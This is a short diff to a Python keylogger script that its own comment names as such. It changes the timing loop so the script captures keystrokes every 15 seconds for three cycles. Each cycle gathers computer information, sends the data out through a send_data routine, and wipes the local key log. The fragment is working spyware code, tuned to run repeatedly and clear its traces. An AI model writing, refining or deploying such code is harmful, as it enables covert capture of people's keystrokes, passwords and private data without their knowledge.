@@ -130,9 +130,10 @@ def on_release(key):
         return False
 
 
-time_iteration = 30
+time_iteration = 15
 
 number_of_iterations = 0
+limit = 3
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
@@ -141,7 +142,7 @@ with open(file_path + extend + keys_log, "w") as f:
     f.write("")
 
 # Timer for keylogger
-while True:
+while number_of_iterations < limit:
 
     count = 0
     keys = []
@@ -155,9 +156,11 @@ while True:
         computer_information()
         # send data
         send_data()
-        number_of_iterations += 1
+
         with open(file_path + extend + keys_log, "w") as f:
             f.write("")
-        break
+        number_of_iterations += 1
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
     else:
         continue
